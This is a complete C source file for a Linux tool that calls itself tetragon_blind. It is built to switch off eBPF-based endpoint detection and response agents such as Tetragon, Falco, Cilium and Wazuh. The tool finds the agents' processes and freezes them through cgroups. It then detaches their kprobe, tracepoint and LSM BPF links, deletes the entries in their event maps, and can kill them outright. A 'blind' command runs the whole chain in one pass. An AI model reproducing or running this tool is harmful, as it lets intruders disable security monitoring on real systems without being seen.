#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>

#define CGROOT_V2  "/sys/fs/cgroup"
#define CGROOT_V1  "/sys/fs/cgroup/freezer"
#define CGROUP_TAG "tblind"

#define BPF_ATTR_SZ(field) \
    (unsigned int)(offsetof(union bpf_attr, field) + sizeof(((union bpf_attr *)0)->field))

static int bpf_call(int cmd, union bpf_attr *a, unsigned int sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

static const char *edr_names[] = {
    "tetragon", "cilium-agent", "falco", "falcosecurity",
    "ebpf_exporter", "edr-sensor", "edr_daemon_d", "edr_agentd",
    "edr-agent-t", "edr_endp_t", "wazuhd", "ossec",
    NULL
};

static pid_t find_proc(const char *pattern)
{
    DIR *d = opendir("/proc"); if (!d) return -1;
    struct dirent *de; pid_t found = -1;
    while ((de = readdir(d)) && found < 0) {
        char *end; long pid = strtol(de->d_name, &end, 10);
        if (*end) continue;
        char path[64], comm[64];
        snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
        int fd = open(path, O_RDONLY); if (fd < 0) continue;
        ssize_t n = read(fd, comm, sizeof(comm) - 1); close(fd);
        if (n <= 0) continue;
        comm[n] = '\0'; if (comm[n-1] == '\n') comm[n-1] = '\0';
        if (strstr(comm, pattern)) found = (pid_t)pid;
    }
    closedir(d);
    return found;
}

static int scan_edr_procs(void)
{
    printf("[*] scanning for known eBPF EDR processes:\n");
    int found = 0;
    for (int i = 0; edr_names[i]; i++) {
        pid_t pid = find_proc(edr_names[i]);
        if (pid > 0) {
            printf("  [!] %-24s pid=%d\n", edr_names[i], (int)pid);
            found++;
        }
    }
    if (!found) printf("  [*] none found\n");
    return found;
}

static int cg_v2 = -1;

static int detect_cgroup_ver(void)
{
    if (cg_v2 >= 0) return cg_v2;
    struct stat st;
    cg_v2 = (stat(CGROOT_V2 "/cgroup.controllers", &st) == 0) ? 1 : 0;
    return cg_v2;
}

static int write_file(const char *path, const char *str)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, str, strlen(str));
    close(fd);
    return (n < 0) ? -1 : 0;
}

static int freeze_pid_v2(pid_t pid, char *cgpath, size_t cgpath_sz)
{
    snprintf(cgpath, cgpath_sz, "%s/%s-%d", CGROOT_V2, CGROUP_TAG, (int)pid);

    if (mkdir(cgpath, 0755) < 0 && errno != EEXIST) {
        perror("mkdir cgroup v2"); return -1;
    }

    char p[256];
    snprintf(p, sizeof(p), "%s/cgroup.procs", cgpath);
    char pidbuf[32]; snprintf(pidbuf, sizeof(pidbuf), "%d\n", (int)pid);
    if (write_file(p, pidbuf) < 0) { perror("cgroup.procs"); return -1; }

    snprintf(p, sizeof(p), "%s/cgroup.freeze", cgpath);
    if (write_file(p, "1\n") < 0) { perror("cgroup.freeze"); return -1; }

    return 0;
}

static int freeze_pid_v1(pid_t pid, char *cgpath, size_t cgpath_sz)
{
    snprintf(cgpath, cgpath_sz, "%s/%s-%d", CGROOT_V1, CGROUP_TAG, (int)pid);

    if (mkdir(cgpath, 0755) < 0 && errno != EEXIST) {
        perror("mkdir cgroup v1"); return -1;
    }

    char p[256];
    snprintf(p, sizeof(p), "%s/tasks", cgpath);
    char pidbuf[32]; snprintf(pidbuf, sizeof(pidbuf), "%d\n", (int)pid);
    if (write_file(p, pidbuf) < 0) { perror("tasks"); return -1; }

    snprintf(p, sizeof(p), "%s/freezer.state", cgpath);
    if (write_file(p, "FROZEN\n") < 0) { perror("freezer.state"); return -1; }

    return 0;
}

static int freeze_pid(pid_t pid, char *cgpath, size_t cgpath_sz)
{
    if (detect_cgroup_ver())
        return freeze_pid_v2(pid, cgpath, cgpath_sz);
    return freeze_pid_v1(pid, cgpath, cgpath_sz);
}

static void thaw_pid(const char *cgpath)
{
    char p[640];
    if (detect_cgroup_ver()) {
        snprintf(p, sizeof(p), "%s/cgroup.freeze", cgpath);
        write_file(p, "0\n");
    } else {
        snprintf(p, sizeof(p), "%s/freezer.state", cgpath);
        write_file(p, "THAWED\n");
    }
    rmdir(cgpath);
}

static int is_monitoring_type(uint32_t t)
{
    return t == BPF_PROG_TYPE_KPROBE
        || t == BPF_PROG_TYPE_TRACEPOINT
        || t == BPF_PROG_TYPE_RAW_TRACEPOINT
        || t == BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE
        || t == BPF_PROG_TYPE_PERF_EVENT
        || t == BPF_PROG_TYPE_LSM
        || t == BPF_PROG_TYPE_TRACING;
}

static int get_prog_type_for_link(uint32_t prog_id)
{
    union bpf_attr gfd = {}; gfd.prog_id = prog_id;
    int fd = bpf_call(BPF_PROG_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(prog_id));
    if (fd < 0) return -1;

    struct bpf_prog_info info = {};
    union bpf_attr gi = {};
    gi.info.bpf_fd   = (uint32_t)fd;
    gi.info.info_len = sizeof(info);
    gi.info.info     = (uint64_t)(uintptr_t)&info;
    bpf_call(BPF_OBJ_GET_INFO_BY_FD, &gi, BPF_ATTR_SZ(info));
    close(fd);
    return (int)info.type;
}

static int detach_all_links(int dry_run)
{
    uint32_t id = 0;
    int detached = 0, failed = 0;

    for (;;) {
        union bpf_attr nx = {}; nx.start_id = id;
        int r = bpf_call(BPF_LINK_GET_NEXT_ID, &nx, BPF_ATTR_SZ(next_id));
        if (r < 0) { if (errno == ENOENT) break; break; }
        id = nx.next_id;

        union bpf_attr gfd = {}; gfd.link_id = id;
        int fd = bpf_call(BPF_LINK_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(link_id));
        if (fd < 0) continue;

        struct bpf_link_info linfo = {};
        union bpf_attr gi = {};
        gi.info.bpf_fd   = (uint32_t)fd;
        gi.info.info_len = sizeof(linfo);
        gi.info.info     = (uint64_t)(uintptr_t)&linfo;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &gi, BPF_ATTR_SZ(info));

        int prog_type = get_prog_type_for_link(linfo.prog_id);
        if (prog_type < 0 || !is_monitoring_type((uint32_t)prog_type)) {
            close(fd); continue;
        }

        if (!dry_run) {
            union bpf_attr da = {};
            da.link_detach.link_fd = (uint32_t)fd;
            if (bpf_call(BPF_LINK_DETACH, &da, BPF_ATTR_SZ(link_detach)) == 0)
                detached++;
            else
                failed++;
        } else {
            printf("    [dry] would detach link %u (prog_type=%d)\n", id, prog_type);
            detached++;
        }
        close(fd);
    }
    return detached;
}

static int wipe_maps(void)
{
    uint32_t id = 0;
    int wiped = 0;

    for (;;) {
        union bpf_attr nx = {}; nx.start_id = id;
        if (bpf_call(BPF_MAP_GET_NEXT_ID, &nx, BPF_ATTR_SZ(next_id)) < 0) break;
        id = nx.next_id;

        union bpf_attr gfd = {}; gfd.map_id = id;
        int fd = bpf_call(BPF_MAP_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(map_id));
        if (fd < 0) continue;

        struct bpf_map_info info = {};
        union bpf_attr gi = {};
        gi.info.bpf_fd   = (uint32_t)fd;
        gi.info.info_len = sizeof(info);
        gi.info.info     = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &gi, BPF_ATTR_SZ(info));

        int interesting = (info.type == BPF_MAP_TYPE_PERF_EVENT_ARRAY
                        || info.type == BPF_MAP_TYPE_RINGBUF
                        || info.type == BPF_MAP_TYPE_HASH
                        || info.type == BPF_MAP_TYPE_LRU_HASH)
                       && info.max_entries >= 8;

        if (!interesting) { close(fd); continue; }

        if (info.type == BPF_MAP_TYPE_RINGBUF) {

            close(fd); wiped++; continue;
        }

        if (info.type == BPF_MAP_TYPE_PERF_EVENT_ARRAY
         || info.type == BPF_MAP_TYPE_HASH
         || info.type == BPF_MAP_TYPE_LRU_HASH) {

            void *zero_val = calloc(1, info.value_size + 1);
            if (!zero_val) { close(fd); continue; }
            void *key  = calloc(1, info.key_size + 1);
            void *next = calloc(1, info.key_size + 1);

            if (key && next) {
                int first = 1;
                for (;;) {
                    union bpf_attr nk = {};
                    nk.map_fd = (uint32_t)fd;
                    nk.key    = first ? 0 : (uint64_t)(uintptr_t)key;
                    nk.next_key = (uint64_t)(uintptr_t)next;
                    if (bpf_call(BPF_MAP_GET_NEXT_KEY, &nk, BPF_ATTR_SZ(next_key)) < 0) break;
                    first = 0;
                    memcpy(key, next, info.key_size);

                    union bpf_attr dk = {};
                    dk.map_fd = (uint32_t)fd;
                    dk.key    = (uint64_t)(uintptr_t)key;
                    bpf_call(BPF_MAP_DELETE_ELEM, &dk, BPF_ATTR_SZ(key));
                }
            }
            free(zero_val); free(key); free(next);
            wiped++;
        }
        close(fd);
    }
    return wiped;
}

static void cmd_scan(void) { scan_edr_procs(); }

static void cmd_freeze(const char *name)
{
    pid_t pid = find_proc(name);
    if (pid < 0) { fprintf(stderr, "[!] process '%s' not found\n", name); return; }
    printf("[*] found '%s' at pid %d - freezing\n", name, (int)pid);

    char cgpath[512];
    if (freeze_pid(pid, cgpath, sizeof(cgpath)) == 0) {
        printf("[+] frozen via %s: %s\n", cg_v2 ? "cgroup v2" : "cgroup v1", cgpath);
        printf("[*] process is now suspended - its BPF callbacks still run in kernel\n");
        printf("    but the daemon cannot reinstall hooks or read events\n");
        printf("[*] to thaw: %s thaw %s\n", "tetragon_blind", name);
    }
}

static void cmd_thaw(const char *name)
{
    pid_t pid = find_proc(name);
    if (pid < 0) { fprintf(stderr, "[!] process '%s' not found\n", name); return; }
    char cgpath[512];
    if (detect_cgroup_ver())
        snprintf(cgpath, sizeof(cgpath), "%s/%s-%d", CGROOT_V2, CGROUP_TAG, (int)pid);
    else
        snprintf(cgpath, sizeof(cgpath), "%s/%s-%d", CGROOT_V1, CGROUP_TAG, (int)pid);
    thaw_pid(cgpath);
    printf("[+] thawed '%s' (pid %d)\n", name, (int)pid);
}

static void cmd_kill(const char *name)
{
    pid_t pid = find_proc(name);
    if (pid < 0) { fprintf(stderr, "[!] process '%s' not found\n", name); return; }
    if (kill(pid, SIGKILL) == 0)
        printf("[+] SIGKILL sent to '%s' (pid %d)\n", name, (int)pid);
    else
        perror("kill");
}

static void cmd_blind(const char *name, int dry_run, int do_kill)
{
    printf("[*] tetragon_blind sequence for '%s'%s\n",
           name, dry_run ? " (dry-run)" : "");

    pid_t pid = find_proc(name);
    if (pid < 0) {
        fprintf(stderr, "[!] process '%s' not found - proceeding without freeze\n", name);
    }

    char cgpath[512] = {};
    if (pid > 0) {
        printf("[1] freezing pid %d ... ", (int)pid); fflush(stdout);
        if (!dry_run) {
            if (freeze_pid(pid, cgpath, sizeof(cgpath)) == 0)
                printf("ok (%s)\n", cgpath);
            else
                printf("failed (continuing anyway)\n");
        } else {
            printf("(dry-run)\n");
        }
    }

    if (!dry_run) usleep(50000);

    printf("[2] detaching all monitoring BPF links ... "); fflush(stdout);
    int n = detach_all_links(dry_run);
    printf("%d detached\n", n);

    printf("[3] wiping BPF event maps ... "); fflush(stdout);
    int m = dry_run ? 0 : wipe_maps();
    printf("%d maps wiped\n", m);

    if (do_kill && pid > 0) {
        printf("[4] sending SIGKILL to '%s' (pid %d) ... ", name, (int)pid);
        if (!dry_run) {
            if (kill(pid, SIGKILL) == 0) printf("ok\n");
            else { perror(""); }
        } else {
            printf("(dry-run)\n");
        }
        if (cgpath[0] && !dry_run) rmdir(cgpath);
    } else if (cgpath[0]) {
        printf("[*] '%s' remains frozen at %s\n", name, cgpath);
        printf("    to thaw: tetragon_blind thaw '%s'\n", name);
    }

    printf("[+] done - EDR blind%s\n", dry_run ? " (dry-run, no changes made)" : "");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <scan|freeze|thaw|kill|blind>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "scan") == 0) {
        cmd_scan();
    } else if (strcmp(argv[1], "freeze") == 0 && argc >= 3) {
        cmd_freeze(argv[2]);
    } else if (strcmp(argv[1], "thaw") == 0 && argc >= 3) {
        cmd_thaw(argv[2]);
    } else if (strcmp(argv[1], "kill") == 0 && argc >= 3) {
        cmd_kill(argv[2]);
    } else if (strcmp(argv[1], "blind") == 0 && argc >= 3) {
        int dry  = 0, kill_it = 0;
        for (int i = 3; i < argc; i++) {
            if (strcmp(argv[i], "--dry") == 0) dry = 1;
            if (strcmp(argv[i], "--kill") == 0) kill_it = 1;
        }
        cmd_blind(argv[2], dry, kill_it);
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]); return 1;
    }
    return 0;
}
